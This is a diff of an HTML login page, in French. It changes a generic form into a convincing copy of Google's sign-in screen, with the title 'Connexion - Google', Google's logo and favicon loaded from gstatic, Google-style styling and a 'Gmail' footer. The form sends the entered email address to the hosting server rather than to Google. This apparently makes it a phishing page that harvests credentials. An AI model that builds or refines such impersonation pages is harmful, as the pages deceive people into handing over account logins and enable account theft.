@@ -1,14 +1,94 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-  <title>Connexion sécurisée</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion - Google</title>
+    <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <style>
+        body {
+            font-family: Roboto, Arial, sans-serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            padding: 0;
+        }
+
+        .login-container {
+            max-width: 400px;
+            margin: 60px auto;
+            background-color: #fff;
+            padding: 30px 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto 20px;
+            width: 75px;
+        }
+
+        h2 {
+            text-align: center;
+            font-weight: normal;
+            color: #202124;
+        }
+
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 10px;
+            margin: 12px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .btn {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .btn:hover {
+            background-color: #155db2;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #777;
+            font-size: 12px;
+        }
+
+        @media (max-width: 500px) {
+            .login-container {
+                margin: 30px 15px;
+                padding: 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <h2>Connexion</h2>
-  <form method="post" action="/login">
-    Email : <input type="text" name="email"><br>
-    Mot de passe : <input type="password" name="password"><br>
-    <input type="submit" value="Se connecter">
-  </form>
+
+    <div class="login-container">
+        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="logo">
+        <h2>Connexion</h2>
+
+        <form method="POST" action="/">
+            <input type="text" name="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
+            <button type="submit" class="btn">Suivant</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        Gmail 
+    </div>
+
 </body>
 </html>
